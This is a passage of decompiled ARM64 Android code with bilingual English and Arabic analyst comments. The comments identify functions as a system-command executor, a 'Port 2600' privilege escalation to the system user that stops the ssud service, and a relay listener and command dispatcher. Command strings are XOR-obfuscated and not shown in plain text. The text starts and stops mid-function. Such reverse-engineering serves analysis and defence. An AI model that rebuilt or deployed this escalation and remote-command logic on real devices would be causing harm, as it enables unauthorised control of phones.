        local_5b8 = local_5b8 & 0xffffffffffff0000;
        if ((uVar18 & 1) != 0) goto LAB_0019b75c;
LAB_0019b814:
        pclose(__stream);
      }
      if ((local_5b8 & 1) != 0) {
        free(local_5a8);
      }
      if ((local_5a0 & 1) != 0) {
        free(local_590);
      }
      if ((local_588 & 1) != 0) {
        free(local_578);
      }
      if ((local_570 & 1) != 0) {
        free(local_560);
      }
      if ((local_558 & 1) != 0) {
        free(local_548);
      }
    }
    if ((local_540 & 1) != 0) {
      free(local_530);
    }
    if ((local_528 & 1) != 0) {
      free(local_518);
    }
    if ((local_510 & 1) != 0) {
      free(local_500);
    }
    if (iVar10 < 3) {
      if (*(long *)(lVar1 + 0x28) != local_88) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
  } while( true );
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_0019ba18
 * Purpose (EN): Direct System Command Executor
 * Purpose (AR): تنفيذ أوامر النظام system() مباشرة
 */

// Function: FUN_0019ba18 @ 0019ba18
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_0019ba18(void)

{
  long lVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  undefined8 uVar6;
  int iVar7;
  undefined8 local_60;
  undefined8 uStack_58;
  undefined8 local_50;
  undefined8 uStack_48;
  undefined8 local_40;
  undefined2 local_38;
  long local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(long *)(lVar1 + 0x28);
  FUN_0019b07c();
  uVar6 = DAT_00177a78;
  uVar5 = _UNK_001776f8;
  uVar4 = _DAT_001776f0;
  uVar3 = _UNK_00176df8;
  uVar2 = _DAT_00176df0;
  local_38 = 0x31;
  uStack_58 = _UNK_001776f8;
  local_60 = _DAT_001776f0;
  uStack_48 = _UNK_00176df8;
  local_50 = _DAT_00176df0;
  local_40 = DAT_00177a78;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  FUN_0019b07c(iVar7);
  local_40 = uVar6;
  local_38 = 0x31;
  uStack_58 = uVar5;
  local_60 = uVar4;
  uStack_48 = uVar3;
  local_50 = uVar2;
  iVar7 = system((char *)&local_60);
  if (*(long *)(lVar1 + 0x28) == local_28) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(iVar7);
}



// ----------------------------------------------------------------




// ============================================================================
// MODULE 2: Port 2600 Auto-Escalation & Relay (مصعد الصلاحيات عبر البورت 2600)
// ============================================================================


/*
 * [PHONE FUNCTION] FUN_001a63e0
 * Purpose (EN): Port 2600 Escalation & UID 1000 Handshake
 * Purpose (AR): التحقق من بورت 2600 وإيقاف ssud ورفع الصلاحيات لـ system
 */

// Function: FUN_001a63e0 @ 001a63e0
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001a63e0(void)

{
  char cVar1;
  long lVar2;
  long *plVar3;
  int iVar4;
  undefined8 uVar5;
  byte *pbVar6;
  long lVar7;
  undefined8 *puVar8;
  undefined1 *puVar9;
  byte bVar10;
  byte bVar11;
  byte bVar12;
  byte bVar13;
  byte bVar14;
  byte bVar15;
  byte bVar16;
  byte bVar17;
  byte bVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  byte bVar24;
  byte bVar25;
  undefined8 uVar26;
  undefined8 uVar27;
  undefined8 uVar28;
  undefined8 uVar29;
  undefined8 uVar30;
  long *local_a8;
  undefined8 uStack_a0;
  char acStack_94 [92];
  long local_38;
  
  lVar2 = tpidr_el0;
  local_38 = *(long *)(lVar2 + 0x28);
  local_a8 = (long *)0x0;
  uStack_a0 = 0;
  iVar4 = FUN_001c2240(&uStack_a0,&local_a8);
  if (iVar4 != 0) {
    uVar5 = 0xffffffff;
    if (*(long *)(lVar2 + 0x28) == local_38) {
      return;
    }
    goto LAB_001a683c;
  }
  pbVar6 = (byte *)FUN_002295c4(&DAT_00235950);
  if ((*pbVar6 & 1) == 0) {
    uVar5 = FUN_002295c4(&DAT_00235930);
    FUN_001b371c(uVar5,&DAT_0017936a);
    FUN_002234c0(&LAB_001b37d0,uVar5,0x2362d0);
    puVar9 = (undefined1 *)FUN_002295c4(&DAT_00235950);
    *puVar9 = 1;
  }
  uVar5 = FUN_002295c4(&DAT_00235930);
  FUN_001b5fec();
  __system_property_get(uVar5,acStack_94);
  iVar4 = atoi(acStack_94);
  plVar3 = local_a8;
  if (iVar4 < 0x1e) {
    pbVar6 = (byte *)FUN_002295c4(&DAT_002359d0);
    if ((*pbVar6 & 1) == 0) {
      uVar5 = FUN_002295c4(&DAT_002359b0);
      FUN_001b398c(uVar5,&DAT_001793b1);
      FUN_002234c0(&LAB_001b3b10,uVar5,0x2362d0);
      puVar9 = (undefined1 *)FUN_002295c4(&DAT_002359d0);
      *puVar9 = 1;
      lVar7 = FUN_002295c4(&DAT_002359b0);
      cVar1 = *(char *)(lVar7 + 0x2f);
    }
    else {
      lVar7 = FUN_002295c4(&DAT_002359b0);
      cVar1 = *(char *)(lVar7 + 0x2f);
    }
    if (cVar1 != '\0') {
      puVar8 = (undefined8 *)FUN_002295c4(&DAT_002359b0);
      *(byte *)(puVar8 + 4) = *(byte *)(puVar8 + 4) ^ 0x27;
      *(byte *)((long)puVar8 + 0x21) = *(byte *)((long)puVar8 + 0x21) ^ 1;
      *(byte *)((long)puVar8 + 0x22) = *(byte *)((long)puVar8 + 0x22) ^ 0xe1;
      *(byte *)((long)puVar8 + 0x23) = *(byte *)((long)puVar8 + 0x23) ^ 0x89;
      uVar27 = _UNK_00176d38;
      uVar5 = _DAT_00176d30;
      *(byte *)((long)puVar8 + 0x24) = *(byte *)((long)puVar8 + 0x24) ^ 0x2b;
      *(byte *)((long)puVar8 + 0x25) = *(byte *)((long)puVar8 + 0x25) ^ 0x67;
      uVar28 = puVar8[1];
      uVar26 = *puVar8;
      uVar30 = puVar8[3];
      uVar29 = puVar8[2];
      *(byte *)((long)puVar8 + 0x26) = *(byte *)((long)puVar8 + 0x26) ^ 99;
      *(byte *)((long)puVar8 + 0x27) = *(byte *)((long)puVar8 + 0x27) ^ 0x5b;
      *(byte *)(puVar8 + 5) = *(byte *)(puVar8 + 5) ^ 0x27;
      *(byte *)((long)puVar8 + 0x29) = *(byte *)((long)puVar8 + 0x29) ^ 1;
      bVar10 = (byte)((ulong)uVar5 >> 8);
      bVar11 = (byte)((ulong)uVar5 >> 0x10);
      bVar12 = (byte)((ulong)uVar5 >> 0x18);
      bVar13 = (byte)((ulong)uVar5 >> 0x20);
      bVar14 = (byte)((ulong)uVar5 >> 0x28);
      bVar15 = (byte)((ulong)uVar5 >> 0x30);
      bVar16 = (byte)((ulong)uVar5 >> 0x38);
      bVar17 = (byte)((ulong)uVar27 >> 8);
      bVar18 = (byte)((ulong)uVar27 >> 0x10);
      bVar19 = (byte)((ulong)uVar27 >> 0x18);
      bVar20 = (byte)((ulong)uVar27 >> 0x20);
      bVar21 = (byte)((ulong)uVar27 >> 0x28);
      bVar22 = (byte)((ulong)uVar27 >> 0x30);
      bVar23 = (byte)((ulong)uVar27 >> 0x38);
      *(byte *)((long)puVar8 + 0x2a) = *(byte *)((long)puVar8 + 0x2a) ^ 0xe1;
      *(byte *)((long)puVar8 + 0x2b) = *(byte *)((long)puVar8 + 0x2b) ^ 0x89;
      puVar9 = (undefined1 *)((long)puVar8 + 0x2f);
      puVar8[1] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ bVar23,
                           CONCAT16((byte)((ulong)uVar28 >> 0x30) ^ bVar22,
                                    CONCAT15((byte)((ulong)uVar28 >> 0x28) ^ bVar21,
                                             CONCAT14((byte)((ulong)uVar28 >> 0x20) ^ bVar20,
                                                      CONCAT13((byte)((ulong)uVar28 >> 0x18) ^
                                                               bVar19,CONCAT12((byte)((ulong)uVar28
                                                                                     >> 0x10) ^
                                                                               bVar18,CONCAT11((byte
                                                  )((ulong)uVar28 >> 8) ^ bVar17,
                                                  (byte)uVar28 ^ (byte)uVar27)))))));
      *puVar8 = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar16,
                         CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar15,
                                  CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar14,
                                           CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar13,
                                                    CONCAT13((byte)((ulong)uVar26 >> 0x18) ^ bVar12,
                                                             CONCAT12((byte)((ulong)uVar26 >> 0x10)
                                                                      ^ bVar11,CONCAT11((byte)((
                                                  ulong)uVar26 >> 8) ^ bVar10,
                                                  (byte)uVar26 ^ (byte)uVar5)))))));
      puVar8[3] = CONCAT17((byte)((ulong)uVar30 >> 0x38) ^ bVar23,
                           CONCAT16((byte)((ulong)uVar30 >> 0x30) ^ bVar22,
                                    CONCAT15((byte)((ulong)uVar30 >> 0x28) ^ bVar21,
                                             CONCAT14((byte)((ulong)uVar30 >> 0x20) ^ bVar20,
                                                      CONCAT13((byte)((ulong)uVar30 >> 0x18) ^
                                                               bVar19,CONCAT12((byte)((ulong)uVar30
                                                                                     >> 0x10) ^
                                                                               bVar18,CONCAT11((byte
                                                  )((ulong)uVar30 >> 8) ^ bVar17,
                                                  (byte)uVar30 ^ (byte)uVar27)))))));
      puVar8[2] = CONCAT17((byte)((ulong)uVar29 >> 0x38) ^ bVar16,
                           CONCAT16((byte)((ulong)uVar29 >> 0x30) ^ bVar15,
                                    CONCAT15((byte)((ulong)uVar29 >> 0x28) ^ bVar14,
                                             CONCAT14((byte)((ulong)uVar29 >> 0x20) ^ bVar13,
                                                      CONCAT13((byte)((ulong)uVar29 >> 0x18) ^
                                                               bVar12,CONCAT12((byte)((ulong)uVar29
                                                                                     >> 0x10) ^
                                                                               bVar11,CONCAT11((byte
                                                  )((ulong)uVar29 >> 8) ^ bVar10,
                                                  (byte)uVar29 ^ (byte)uVar5)))))));
      *(byte *)((long)puVar8 + 0x2c) = *(byte *)((long)puVar8 + 0x2c) ^ 0x2b;
      *(byte *)((long)puVar8 + 0x2d) = *(byte *)((long)puVar8 + 0x2d) ^ 0x67;
      *(byte *)((long)puVar8 + 0x2e) = *(byte *)((long)puVar8 + 0x2e) ^ 99;
      goto LAB_001a6618;
    }
    lVar7 = (**(code **)(*plVar3 + 0x30))(plVar3,lVar7);
    plVar3 = local_a8;
  }
  else {
    pbVar6 = (byte *)FUN_002295c4(&DAT_00235990);
    if ((*pbVar6 & 1) == 0) {
      uVar5 = FUN_002295c4(&DAT_00235970);
      FUN_001b37dc(uVar5,&DAT_0017937f);
      FUN_002234c0(&LAB_001b3978,uVar5,0x2362d0);
      puVar9 = (undefined1 *)FUN_002295c4(&DAT_00235990);
      *puVar9 = 1;
      lVar7 = FUN_002295c4(&DAT_00235970);
      cVar1 = *(char *)(lVar7 + 0x32);
    }
    else {
      lVar7 = FUN_002295c4(&DAT_00235970);
      cVar1 = *(char *)(lVar7 + 0x32);
    }
    if (cVar1 == '\0') {
      lVar7 = (**(code **)(*plVar3 + 0x30))(plVar3,lVar7);
      plVar3 = local_a8;
    }
    else {
      puVar8 = (undefined8 *)FUN_002295c4(&DAT_00235970);
      uVar27 = puVar8[1];
      uVar5 = *puVar8;
      uVar28 = puVar8[3];
      uVar26 = puVar8[2];
      uVar30 = puVar8[5];
      uVar29 = puVar8[4];
      bVar10 = (byte)_DAT_00176f20;
      bVar11 = (byte)((ulong)_DAT_00176f20 >> 8);
      bVar12 = (byte)((ulong)_DAT_00176f20 >> 0x10);
      bVar13 = (byte)((ulong)_DAT_00176f20 >> 0x18);
      bVar14 = (byte)((ulong)_DAT_00176f20 >> 0x20);
      bVar15 = (byte)((ulong)_DAT_00176f20 >> 0x28);
      bVar16 = (byte)((ulong)_DAT_00176f20 >> 0x30);
      bVar17 = (byte)((ulong)_DAT_00176f20 >> 0x38);
      bVar18 = (byte)_UNK_00176f28;
      bVar19 = (byte)((ulong)_UNK_00176f28 >> 8);
      bVar20 = (byte)((ulong)_UNK_00176f28 >> 0x10);
      bVar21 = (byte)((ulong)_UNK_00176f28 >> 0x18);
      bVar22 = (byte)((ulong)_UNK_00176f28 >> 0x20);
      bVar23 = (byte)((ulong)_UNK_00176f28 >> 0x28);
      bVar24 = (byte)((ulong)_UNK_00176f28 >> 0x30);
      bVar25 = (byte)((ulong)_UNK_00176f28 >> 0x38);
      *(byte *)(puVar8 + 6) = *(byte *)(puVar8 + 6) ^ 0x21;
      puVar9 = (undefined1 *)((long)puVar8 + 0x32);
      puVar8[1] = CONCAT17((byte)((ulong)uVar27 >> 0x38) ^ bVar25,
                           CONCAT16((byte)((ulong)uVar27 >> 0x30) ^ bVar24,
                                    CONCAT15((byte)((ulong)uVar27 >> 0x28) ^ bVar23,
                                             CONCAT14((byte)((ulong)uVar27 >> 0x20) ^ bVar22,
                                                      CONCAT13((byte)((ulong)uVar27 >> 0x18) ^
                                                               bVar21,CONCAT12((byte)((ulong)uVar27
                                                                                     >> 0x10) ^
                                                                               bVar20,CONCAT11((byte
                                                  )((ulong)uVar27 >> 8) ^ bVar19,
                                                  (byte)uVar27 ^ bVar18)))))));
      *puVar8 = CONCAT17((byte)((ulong)uVar5 >> 0x38) ^ bVar17,
                         CONCAT16((byte)((ulong)uVar5 >> 0x30) ^ bVar16,
                                  CONCAT15((byte)((ulong)uVar5 >> 0x28) ^ bVar15,
                                           CONCAT14((byte)((ulong)uVar5 >> 0x20) ^ bVar14,
                                                    CONCAT13((byte)((ulong)uVar5 >> 0x18) ^ bVar13,
                                                             CONCAT12((byte)((ulong)uVar5 >> 0x10) ^
                                                                      bVar12,CONCAT11((byte)((ulong)
                                                  uVar5 >> 8) ^ bVar11,(byte)uVar5 ^ bVar10)))))));
      puVar8[3] = CONCAT17((byte)((ulong)uVar28 >> 0x38) ^ bVar25,
                           CONCAT16((byte)((ulong)uVar28 >> 0x30) ^ bVar24,
                                    CONCAT15((byte)((ulong)uVar28 >> 0x28) ^ bVar23,
                                             CONCAT14((byte)((ulong)uVar28 >> 0x20) ^ bVar22,
                                                      CONCAT13((byte)((ulong)uVar28 >> 0x18) ^
                                                               bVar21,CONCAT12((byte)((ulong)uVar28
                                                                                     >> 0x10) ^
                                                                               bVar20,CONCAT11((byte
                                                  )((ulong)uVar28 >> 8) ^ bVar19,
                                                  (byte)uVar28 ^ bVar18)))))));
      puVar8[2] = CONCAT17((byte)((ulong)uVar26 >> 0x38) ^ bVar17,
                           CONCAT16((byte)((ulong)uVar26 >> 0x30) ^ bVar16,
                                    CONCAT15((byte)((ulong)uVar26 >> 0x28) ^ bVar15,
                                             CONCAT14((byte)((ulong)uVar26 >> 0x20) ^ bVar14,
                                                      CONCAT13((byte)((ulong)uVar26 >> 0x18) ^
                                                               bVar13,CONCAT12((byte)((ulong)uVar26
                                                                                     >> 0x10) ^
                                                                               bVar12,CONCAT11((byte
                                                  )((ulong)uVar26 >> 8) ^ bVar11,
                                                  (byte)uVar26 ^ bVar10)))))));
      puVar8[5] = CONCAT17((byte)((ulong)uVar30 >> 0x38) ^ bVar25,
                           CONCAT16((byte)((ulong)uVar30 >> 0x30) ^ bVar24,
                                    CONCAT15((byte)((ulong)uVar30 >> 0x28) ^ bVar23,
                                             CONCAT14((byte)((ulong)uVar30 >> 0x20) ^ bVar22,
                                                      CONCAT13((byte)((ulong)uVar30 >> 0x18) ^
                                                               bVar21,CONCAT12((byte)((ulong)uVar30
                                                                                     >> 0x10) ^
                                                                               bVar20,CONCAT11((byte
                                                  )((ulong)uVar30 >> 8) ^ bVar19,
                                                  (byte)uVar30 ^ bVar18)))))));
      puVar8[4] = CONCAT17((byte)((ulong)uVar29 >> 0x38) ^ bVar17,
                           CONCAT16((byte)((ulong)uVar29 >> 0x30) ^ bVar16,
                                    CONCAT15((byte)((ulong)uVar29 >> 0x28) ^ bVar15,
                                             CONCAT14((byte)((ulong)uVar29 >> 0x20) ^ bVar14,
                                                      CONCAT13((byte)((ulong)uVar29 >> 0x18) ^
                                                               bVar13,CONCAT12((byte)((ulong)uVar29
                                                                                     >> 0x10) ^
                                                                               bVar12,CONCAT11((byte
                                                  )((ulong)uVar29 >> 8) ^ bVar11,
                                                  (byte)uVar29 ^ bVar10)))))));
      *(byte *)((long)puVar8 + 0x31) = *(byte *)((long)puVar8 + 0x31) ^ 0x9b;
LAB_001a6618:
      *puVar9 = 0;
      lVar7 = (**(code **)(*plVar3 + 0x30))(plVar3,puVar8);
      plVar3 = local_a8;
    }
  }
  local_a8 = plVar3;
  if (lVar7 == 0) {
    uVar5 = 0xfffffffe;
    if (*(long *)(lVar2 + 0x28) == local_38) {
      return;
    }
  }
  else {
    if (iVar4 < 0x1a) {
      pbVar6 = (byte *)FUN_002295c4(&DAT_00235a50);
      if ((*pbVar6 & 1) == 0) {
        uVar5 = FUN_002295c4(&DAT_00235a30);
        FUN_001b3c24(uVar5,&DAT_001793fd);
        FUN_002234c0(&LAB_001b3d48,uVar5,0x2362d0);
        puVar9 = (undefined1 *)FUN_002295c4(&DAT_00235a50);
        *puVar9 = 1;
      }
      uVar5 = FUN_002295c4(&DAT_00235a30);
      FUN_001b60dc();
    }
    else {
      pbVar6 = (byte *)FUN_002295c4(&DAT_00235a10);
      if ((*pbVar6 & 1) == 0) {
        uVar5 = FUN_002295c4(&DAT_002359f0);
        FUN_001b3b20(uVar5,&DAT_001793e0);
        FUN_002234c0(&LAB_001b3c14,uVar5,0x2362d0);
        puVar9 = (undefined1 *)FUN_002295c4(&DAT_00235a10);
        *puVar9 = 1;
      }
      uVar5 = FUN_002295c4(&DAT_002359f0);
      FUN_001b605c();
    }
    uVar5 = (**(code **)(*plVar3 + 0x480))(plVar3,lVar7,uVar5,&DAT_0013f025);
    uVar5 = (**(code **)(*local_a8 + 0x4b0))(local_a8,0,uVar5);
    if (*(long *)(lVar2 + 0x28) == local_38) {
      return;
    }
  }
LAB_001a683c:
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar5);
}



// ----------------------------------------------------------------




/*
 * [PHONE FUNCTION] FUN_001a68d8
 * Purpose (EN): Relay Listener & Command Dispatcher
 * Purpose (AR): إدارة الاتصال التكراري والترحيل للبورت 2600
 */

// Function: FUN_001a68d8 @ 001a68d8
// ----------------------------------------------------------------

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 FUN_001a68d8(undefined8 param_1,byte *param_2)

{
  char cVar1;
  long lVar2;
  bool bVar3;
  undefined8 uVar4;
  bool bVar5;
  int iVar6;
  byte *pbVar7;
  long lVar8;
  undefined8 *puVar9;
  char *pcVar10;
  size_t sVar11;
  void *__src;
  ulong *puVar12;
  undefined8 uVar13;
  FILE *__stream;
  undefined1 *puVar14;
  undefined8 uVar15;
  void *pvVar16;
  ulong uVar17;
  undefined4 uVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  byte bVar24;
  byte bVar25;
  byte bVar27;
  byte bVar28;
  byte bVar29;
  byte bVar30;
  byte bVar31;
  byte bVar32;
  byte bVar33;
  undefined8 uVar26;
  undefined8 uVar34;
  undefined8 uVar35;
  undefined8 uVar36;
  undefined8 uVar37;
  undefined8 uVar38;
  byte bVar40;
  undefined8 uVar39;
  byte bVar41;
  pthread_t pStack_1d8;
  ulong local_1d0;
  ulong uStack_1c8;
  void *local_1c0;
  byte local_1b0 [16];
  void *local_1a0;
  ulong local_198;
  ulong local_190;
  void *local_188;
  ulong local_180;
  size_t local_178;
  void *local_170;
  ulong local_168;
  size_t sStack_160;
  void *local_158;
  long local_68;
  
  lVar2 = tpidr_el0;
  local_68 = *(long *)(lVar2 + 0x28);
  pbVar7 = (byte *)FUN_002295c4(&DAT_00235a90);
  if ((*pbVar7 & 1) == 0) {
    uVar15 = FUN_002295c4(&DAT_00235a70);
    FUN_001b3d58(uVar15,&DAT_00179420);
    FUN_002234c0(&LAB_001b3ebc,uVar15,0x2362d0);
    puVar14 = (undefined1 *)FUN_002295c4(&DAT_00235a90);
    *puVar14 = 1;
    lVar8 = FUN_002295c4(&DAT_00235a70);
    cVar1 = *(char *)(lVar8 + 0x2b);
  }
  else {
    lVar8 = FUN_002295c4(&DAT_00235a70);
    cVar1 = *(char *)(lVar8 + 0x2b);
  }
  if (cVar1 != '\0') {
    puVar9 = (undefined8 *)FUN_002295c4(&DAT_00235a70);
    uVar4 = _UNK_00177628;
    uVar15 = _DAT_00177620;
    *(undefined1 *)((long)puVar9 + 0x2b) = 0;
    *(byte *)((long)puVar9 + 0x21) = *(byte *)((long)puVar9 + 0x21) ^ 0xed;
    *(byte *)((long)puVar9 + 0x23) = *(byte *)((long)puVar9 + 0x23) ^ 0xb9;
    *(byte *)(puVar9 + 4) = *(byte *)(puVar9 + 4) ^ 0x9b;
    uVar36 = puVar9[1];
    uVar34 = *puVar9;
    uVar39 = puVar9[3];
    uVar38 = puVar9[2];
    *(byte *)((long)puVar9 + 0x22) = *(byte *)((long)puVar9 + 0x22) ^ 0x19;
    *(byte *)((long)puVar9 + 0x26) = *(byte *)((long)puVar9 + 0x26) ^ 0x3f;
    *(byte *)((long)puVar9 + 0x24) = *(byte *)((long)puVar9 + 0x24) ^ 0xb7;
    *(byte *)((long)puVar9 + 0x25) = *(byte *)((long)puVar9 + 0x25) ^ 0x4d;
    bVar19 = (byte)((ulong)uVar15 >> 8);
    bVar20 = (byte)((ulong)uVar15 >> 0x10);
    bVar21 = (byte)((ulong)uVar15 >> 0x18);
    bVar22 = (byte)((ulong)uVar15 >> 0x20);
    bVar23 = (byte)((ulong)uVar15 >> 0x28);
    bVar24 = (byte)((ulong)uVar15 >> 0x30);
    bVar25 = (byte)((ulong)uVar15 >> 0x38);
    bVar27 = (byte)((ulong)uVar4 >> 8);
    bVar28 = (byte)((ulong)uVar4 >> 0x10);
    bVar29 = (byte)((ulong)uVar4 >> 0x18);
    bVar30 = (byte)((ulong)uVar4 >> 0x20);
    bVar31 = (byte)((ulong)uVar4 >> 0x28);
    bVar32 = (byte)((ulong)uVar4 >> 0x30);
    bVar33 = (byte)((ulong)uVar4 >> 0x38);
    *(byte *)((long)puVar9 + 0x27) = *(byte *)((long)puVar9 + 0x27) ^ 0x1f;
    *(byte *)(puVar9 + 5) = *(byte *)(puVar9 + 5) ^ 0x9b;
    *(byte *)((long)puVar9 + 0x29) = *(byte *)((long)puVar9 + 0x29) ^ 0xed;
    puVar9[1] = CONCAT17((byte)((ulong)uVar36 >> 0x38) ^ bVar33,
                         CONCAT16((byte)((ulong)uVar36 >> 0x30) ^ bVar32,
                                  CONCAT15((byte)((ulong)uVar36 >> 0x28) ^ bVar31,
                                           CONCAT14((byte)((ulong)uVar36 >> 0x20) ^ bVar30,
                                                    CONCAT13((byte)((ulong)uVar36 >> 0x18) ^ bVar29,
                                                             CONCAT12((byte)((ulong)uVar36 >> 0x10)
                                                                      ^ bVar28,CONCAT11((byte)((
                                                  ulong)uVar36 >> 8) ^ bVar27,
                                                  (byte)uVar36 ^ (byte)uVar4)))))));
    *puVar9 = CONCAT17((byte)((ulong)uVar34 >> 0x38) ^ bVar25,
                       CONCAT16((byte)((ulong)uVar34 >> 0x30) ^ bVar24,
                                CONCAT15((byte)((ulong)uVar34 >> 0x28) ^ bVar23,
                                         CONCAT14((byte)((ulong)uVar34 >> 0x20) ^ bVar22,
                                                  CONCAT13((byte)((ulong)uVar34 >> 0x18) ^ bVar21,
                                                           CONCAT12((byte)((ulong)uVar34 >> 0x10) ^
                                                                    bVar20,CONCAT11((byte)((ulong)
